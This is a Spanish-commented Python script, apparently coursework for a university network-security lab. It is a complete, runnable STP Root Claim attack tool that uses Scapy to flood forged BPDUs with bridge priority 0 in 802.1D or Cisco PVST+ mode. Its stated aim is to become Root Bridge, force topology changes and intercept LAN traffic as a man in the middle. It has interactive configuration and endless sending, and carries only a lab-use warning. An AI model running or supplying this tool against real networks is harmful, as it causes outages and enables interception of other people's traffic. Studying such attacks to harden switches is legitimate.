#!/usr/bin/env python3
"""
==============================================================================
  STP CLAIM ROOT ATTACK - Herramienta para laboratorio de seguridad en redes
==============================================================================

Descripción:
    Este script realiza un ataque STP (Spanning Tree Protocol) Root Claim.
    El atacante envía BPDUs (Bridge Protocol Data Units) falsas anunciando
    una prioridad de bridge muy baja (0 o 1), lo que engaña a los switches
    legítimos para que elijan al atacante como Root Bridge.

    Consecuencias del ataque:
    - Rediseño de la topología STP (convergencia forzada).
    - El tráfico de la red pasa a través del atacante → MitM pasivo.
    - Posible micro-corte de red durante la reelección del Root Bridge.
    - Degradación del rendimiento / bucles si el atacante no responde bien.

Requisitos:
    - Python 3.x
    - Scapy:  pip install scapy
    - Permisos de root / administrador
    - Interfaz conectada a un segmento con switches STP activo

Autor  : <Nombre> - <Matricula>
Curso  : TSI-203 Seguridad en Redes
Fecha  : 2026
==============================================================================
"""

import sys
import time
import struct
import random
import signal
import subprocess

# Importaciones de Scapy
from scapy.all import (
    Ether, Dot3, LLC, conf, sendp, get_if_hwaddr
)

# ── Constantes STP ─────────────────────────────────────────────────────────────
STP_MULTICAST     = "01:80:c2:00:00:00"   # Dirección multicast STP IEEE 802.1D
PVST_MULTICAST    = "01:00:0c:cc:cc:cd"   # Dirección multicast PVST+ (Cisco)
STP_LLC_DSAP      = 0x42
STP_LLC_SSAP      = 0x42
STP_LLC_CTRL      = 0x03

# Flags BPDU
FLAG_TC           = 0x01  # Topology Change
FLAG_TCA          = 0x80  # Topology Change Acknowledgment

# ── Contadores ─────────────────────────────────────────────────────────────────
sent_count = 0
start_time = None

def signal_handler(sig, frame):
    elapsed = time.time() - start_time if start_time else 0
    print(f"\n\n[!] Ataque detenido.")
    print(f"[*] BPDUs enviadas: {sent_count:,}")
    print(f"[*] Tiempo total  : {elapsed:.2f} s")
    sys.exit(0)

def mac_to_bytes(mac: str) -> bytes:
    """Convierte 'aa:bb:cc:dd:ee:ff' → bytes."""
    return bytes(int(x, 16) for x in mac.split(":"))

def bytes_to_mac(b: bytes) -> str:
    return ":".join(f"{x:02x}" for x in b)

def get_available_interfaces():
    """Obtiene lista de interfaces de red disponibles."""
    try:
        # Para Linux
        output = subprocess.check_output(["ip", "link", "show"], text=True)
        interfaces = []
        for line in output.split('\n'):
            if line and not line.startswith(' '):
                iface = line.split(':')[1].strip()
                if iface != 'lo':
                    interfaces.append(iface)
        return interfaces
    except:
        # Fallback usando Scapy
        from scapy.all import get_if_list
        return [iface for iface in get_if_list() if iface != 'lo']

def get_interface_info(iface):
    """Obtiene información de una interfaz de red."""
    try:
        mac = get_if_hwaddr(iface)
        return mac
    except:
        return None

def build_stp_bpdu(root_priority: int, root_mac: str,
                   bridge_priority: int, bridge_mac: str,
                   port_id: int = 0x8001,
                   root_path_cost: int = 0,
                   hello_time: float = 2.0,
                   max_age: float = 20.0,
                   forward_delay: float = 15.0,
                   flags: int = 0x00) -> bytes:
    """
    Construye un BPDU de tipo Configuration (IEEE 802.1D).

    Estructura del BPDU (35 bytes de payload):
      Protocol ID   : 2 bytes (0x0000)
      Version       : 1 byte  (0x00 = STP clásico)
      BPDU Type     : 1 byte  (0x00 = Configuration)
      Flags         : 1 byte
      Root ID       : 8 bytes (2B prioridad + 6B MAC)
      Root Path Cost: 4 bytes
      Bridge ID     : 8 bytes (2B prioridad + 6B MAC)
      Port ID       : 2 bytes
      Message Age   : 2 bytes (unidades de 1/256 s)
      Max Age       : 2 bytes
      Hello Time    : 2 bytes
      Forward Delay : 2 bytes
    """
    def to_256(val: float) -> int:
        return int(val * 256)

    root_id   = struct.pack("!H", root_priority)   + mac_to_bytes(root_mac)
    bridge_id = struct.pack("!H", bridge_priority) + mac_to_bytes(bridge_mac)

    bpdu = (
        b"\x00\x00"                          # Protocol ID
        b"\x00"                              # Version
        b"\x00"                              # BPDU Type: Configuration
        + bytes([flags])                     # Flags
        + root_id                            # Root Bridge ID
        + struct.pack("!I", root_path_cost)  # Root Path Cost
        + bridge_id                          # Bridge ID
        + struct.pack("!H", port_id)         # Port ID
        + struct.pack("!H", 0)               # Message Age
        + struct.pack("!H", to_256(max_age))
        + struct.pack("!H", to_256(hello_time))
        + struct.pack("!H", to_256(forward_delay))
    )
    return bpdu

def build_frame(iface: str, bridge_mac: str,
                root_priority: int, vlan: int,
                hello_time: float, use_pvst: bool) -> bytes:
    """
    Arma la trama Ethernet 802.3 + LLC + BPDU.
    Si use_pvst=True envía PVST+ con tag de VLAN (Cisco).
    """
    bpdu_payload = build_stp_bpdu(
        root_priority  = root_priority,
        root_mac       = bridge_mac,
        bridge_priority= root_priority,
        bridge_mac     = bridge_mac,
        hello_time     = hello_time,
    )

    dst = PVST_MULTICAST if use_pvst else STP_MULTICAST

    # LLC header
    llc = bytes([STP_LLC_DSAP, STP_LLC_SSAP, STP_LLC_CTRL])

    if use_pvst:
        # PVST+ añade 4 bytes extra antes del LLC: 0x00 00 00 00
        # y usa 802.1Q tag implícito en el encabezado
        pvst_header = bytes([0x00, 0x00, 0x00, 0x00])
        payload = pvst_header + llc + bpdu_payload
    else:
        payload = llc + bpdu_payload

    # Construimos con Scapy para que calcule el campo Length de 802.3
    frame = Dot3(src=bridge_mac, dst=dst, len=len(payload)) / payload
    return frame

def stp_root_attack(iface: str, priority: int, bridge_mac: str,
                    vlan: int, count: int, delay: float,
                    verbose: bool, use_pvst: bool):
    """Función principal del ataque STP Root Claim."""
    global sent_count, start_time

    print("=" * 62)
    print("     STP CLAIM ROOT ATTACK - Herramienta Educativa")
    print("=" * 62)
    print(f"[*] Interfaz        : {iface}")
    print(f"[*] Bridge MAC      : {bridge_mac}")
    print(f"[*] Bridge Priority : {priority} (0x{priority:04X})")
    print(f"[*] VLAN            : {vlan}")
    print(f"[*] Modo            : {'PVST+ (Cisco)' if use_pvst else 'IEEE 802.1D'}")
    print(f"[*] BPDUs a enviar  : {'Infinitas' if count == 0 else count}")
    print(f"[*] Hello interval  : {delay} s")
    print("[*] Iniciando... (Ctrl+C para detener)\n")

    conf.verb = 0
    start_time = time.time()
    infinite = (count == 0)

    try:
        while infinite or sent_count < count:
            frame = build_frame(
                iface         = iface,
                bridge_mac    = bridge_mac,
                root_priority = priority,
                vlan          = vlan,
                hello_time    = delay,
                use_pvst      = use_pvst,
            )
            sendp(frame, iface=iface, verbose=False)
            sent_count += 1

            elapsed = time.time() - start_time
            if verbose:
                print(f"[>] BPDU #{sent_count:>6}  pri={priority}  mac={bridge_mac}  t={elapsed:.1f}s")
            else:
                print(f"[*] BPDUs enviadas: {sent_count:>6}  |  Tiempo: {elapsed:.1f}s  "
                      f"|  Próxima en {delay}s", end="\r")

            time.sleep(delay)

    except PermissionError:
        print("\n[!] ERROR: Se requieren permisos de root.")
        sys.exit(1)

    elapsed = time.time() - start_time
    print(f"\n\n[+] Ataque finalizado.")
    print(f"[*] BPDUs enviadas: {sent_count:,}")
    print(f"[*] Tiempo total  : {elapsed:.2f} s")

def print_banner():
    """Muestra el banner del programa."""
    print("=" * 70)
    print("  ███████╗████████╗██████╗      ██████╗  ██████╗  ██████╗ ████████╗")
    print("  ██╔════╝╚══██╔══╝██╔══██╗    ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝")
    print("  ███████╗   ██║   ██████╔╝    ██████╔╝██║   ██║██║   ██║   ██║   ")
    print("  ╚════██║   ██║   ██╔═══╝     ██╔══██╗██║   ██║██║   ██║   ██║   ")
    print("  ███████║   ██║   ██║         ██║  ██║╚██████╔╝╚██████╔╝   ██║   ")
    print("  ╚══════╝   ╚═╝   ╚═╝         ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ")
    print("=" * 70)
    print("            Herramienta de Ataque STP Root Claim")
    print("                  Para Laboratorio de Seguridad")
    print("=" * 70)
    print()

def get_interactive_params():
    """Obtiene los parámetros de forma interactiva."""
    print("=== CONFIGURACIÓN DEL ATAQUE ===\n")
    
    # 1. Interfaz de red
    interfaces = get_available_interfaces()
    print("Interfaces de red disponibles:")
    for i, iface in enumerate(interfaces, 1):
        mac = get_interface_info(iface)
        print(f"  {i}. {iface} {f'(MAC: {mac})' if mac else ''}")
    
    while True:
        try:
            iface_choice = input("\nSelecciona el número de interfaz a usar: ")
            if iface_choice.isdigit():
                idx = int(iface_choice) - 1
                if 0 <= idx < len(interfaces):
                    iface = interfaces[idx]
                    break
            print("[!] Selección inválida. Intenta de nuevo.")
        except (ValueError, KeyboardInterrupt):
            print("[!] Entrada inválida.")
            sys.exit(1)
    
    print(f"\n✓ Interfaz seleccionada: {iface}")
    
    # 2. Modo STP
    print("\n[1] IEEE 802.1D (STP estándar)")
    print("[2] PVST+ (Cisco)")
    while True:
        try:
            mode = input("Selecciona el modo STP (1/2): ")
            if mode in ['1', '2']:
                use_pvst = (mode == '2')
                break
            print("[!] Selecciona 1 o 2.")
        except KeyboardInterrupt:
            print("[!] Operación cancelada.")
            sys.exit(1)
    
    print(f"\n✓ Modo seleccionado: {'PVST+ (Cisco)' if use_pvst else 'IEEE 802.1D'}")
    
    # 3. Prioridad
    print("\nPrioridad del Bridge:")
    print("  - 0: Prioridad más baja (recomendado para ataque)")
    print("  - 1-4095: Prioridad baja")
    print("  - 4096: Prioridad por defecto en muchos switches")
    while True:
        try:
            priority_input = input("Prioridad del bridge falso [0-65535] (default: 0): ")
            if not priority_input:
                priority = 0
                break
            priority = int(priority_input)
            if 0 <= priority <= 65535:
                break
            print("[!] La prioridad debe estar entre 0 y 65535.")
        except ValueError:
            print("[!] Ingresa un número válido.")
        except KeyboardInterrupt:
            print("[!] Operación cancelada.")
            sys.exit(1)
    
    print(f"\n✓ Prioridad seleccionada: {priority}")
    
    # 4. MAC address
    mac_input = input("\nMAC del bridge falso [Enter para usar MAC de la interfaz]: ")
    if mac_input:
        # Validar formato MAC
        import re
        if re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', mac_input):
            bridge_mac = mac_input
        else:
            print("[!] Formato MAC inválido. Usando MAC de la interfaz.")
            bridge_mac = None
    else:
        bridge_mac = None
    
    if bridge_mac is None:
        try:
            bridge_mac = get_if_hwaddr(iface)
            print(f"✓ Usando MAC de la interfaz: {bridge_mac}")
        except:
            bridge_mac = "00:00:00:00:00:01"
            print(f"✓ Usando MAC generada: {bridge_mac}")
    else:
        print(f"\n✓ MAC seleccionada: {bridge_mac}")
    
    # 5. VLAN (solo si PVST+)
    vlan = 1
    if use_pvst:
        print("\nVLAN ID:")
        while True:
            try:
                vlan_input = input("VLAN ID para PVST+ [1-4094] (default: 1): ")
                if not vlan_input:
                    vlan = 1
                    break
                vlan = int(vlan_input)
                if 1 <= vlan <= 4094:
                    break
                print("[!] VLAN debe estar entre 1 y 4094.")
            except ValueError:
                print("[!] Ingresa un número válido.")
            except KeyboardInterrupt:
                print("[!] Operación cancelada.")
                sys.exit(1)
        print(f"\n✓ VLAN seleccionada: {vlan}")
    
    # 6. Número de BPDUs
    print("\nNúmero de BPDUs a enviar:")
    print("  - 0: Infinitas (hasta Ctrl+C)")
    print("  - N: Número específico")
    while True:
        try:
            count_input = input("Cantidad (default: 0): ")
            if not count_input:
                count = 0
                break
            count = int(count_input)
            if count >= 0:
                break
            print("[!] El número debe ser 0 o positivo.")
        except ValueError:
            print("[!] Ingresa un número válido.")
        except KeyboardInterrupt:
            print("[!] Operación cancelada.")
            sys.exit(1)
    
    if count == 0:
        print("\n✓ Enviando BPDUs indefinidamente (hasta Ctrl+C)")
    else:
        print(f"\n✓ Enviando {count} BPDUs")
    
    # 7. Intervalo Hello
    print("\nIntervalo Hello (tiempo entre BPDUs):")
    print("  - 2.0: Estándar IEEE 802.1D")
    print("  - 0.5-1.0: Más agresivo")
    while True:
        try:
            delay_input = input("Intervalo en segundos (default: 2.0): ")
            if not delay_input:
                delay = 2.0
                break
            delay = float(delay_input)
            if delay > 0:
                break
            print("[!] El intervalo debe ser mayor que 0.")
        except ValueError:
            print("[!] Ingresa un número válido.")
        except KeyboardInterrupt:
            print("[!] Operación cancelada.")
            sys.exit(1)
    
    print(f"\n✓ Intervalo seleccionado: {delay}s")
    
    # 8. Modo verbose
    print("\n¿Mostrar detalles de cada BPDU enviada?")
    print("  [1] Sí (verbose)")
    print("  [2] No (solo resumen)")
    while True:
        try:
            verbose_choice = input("Selecciona (1/2): ")
            if verbose_choice in ['1', '2']:
                verbose = (verbose_choice == '1')
                break
            print("[!] Selecciona 1 o 2.")
        except KeyboardInterrupt:
            print("[!] Operación cancelada.")
            sys.exit(1)
    
    print(f"\n✓ Modo {'verbose' if verbose else 'silencioso'}")
    
    return {
        'iface': iface,
        'priority': priority,
        'bridge_mac': bridge_mac,
        'vlan': vlan,
        'count': count,
        'delay': delay,
        'verbose': verbose,
        'use_pvst': use_pvst
    }

def confirm_attack(params):
    """Muestra resumen y pide confirmación."""
    print("\n" + "=" * 70)
    print("                 RESUMEN DE CONFIGURACIÓN")
    print("=" * 70)
    print(f"  Interfaz        : {params['iface']}")
    print(f"  Bridge MAC      : {params['bridge_mac']}")
    print(f"  Prioridad       : {params['priority']}")
    print(f"  VLAN            : {params['vlan']}")
    print(f"  Modo            : {'PVST+ (Cisco)' if params['use_pvst'] else 'IEEE 802.1D'}")
    print(f"  BPDUs           : {'Infinitas' if params['count'] == 0 else params['count']}")
    print(f"  Intervalo       : {params['delay']}s")
    print(f"  Verbose         : {'Sí' if params['verbose'] else 'No'}")
    print("=" * 70)
    
    print("\n⚠️  ADVERTENCIA: Este ataque puede:")
    print("  • Rediseñar la topología de red")
    print("  • Causar micro-cortes en la red")
    print("  • Permite interceptar tráfico (MitM)")
    print("  • Solo debe usarse en entornos de laboratorio autorizados")
    print()
    
    while True:
        confirm = input("¿Iniciar ataque? (s/N): ").lower()
        if confirm in ['s', 'si', 'y', 'yes']:
            return True
        elif confirm in ['n', 'no', '']:
            return False
        else:
            print("[!] Responde 's' o 'n'")

# ── Main ────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    
    # Verificar permisos de root
    import os
    if os.geteuid() != 0:
        print("[!] Este script requiere permisos de root.")
        print("[!] Ejecuta: sudo python3 stp_root_attack.py")
        sys.exit(1)
    
    print_banner()
    
    try:
        # Obtener parámetros interactivos
        params = get_interactive_params()
        
        # Mostrar resumen y confirmar
        if not confirm_attack(params):
            print("\n[!] Ataque cancelado por el usuario.")
            sys.exit(0)
        
        # Ejecutar ataque
        print("\n[+] Iniciando ataque STP Root Claim...")
        time.sleep(1)
        
        stp_root_attack(
            iface=params['iface'],
            priority=params['priority'],
            bridge_mac=params['bridge_mac'],
            vlan=params['vlan'],
            count=params['count'],
            delay=params['delay'],
            verbose=params['verbose'],
            use_pvst=params['use_pvst']
        )
        
    except KeyboardInterrupt:
        print("\n\n[!] Operación cancelada por el usuario.")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error inesperado: {e}")
        sys.exit(1)
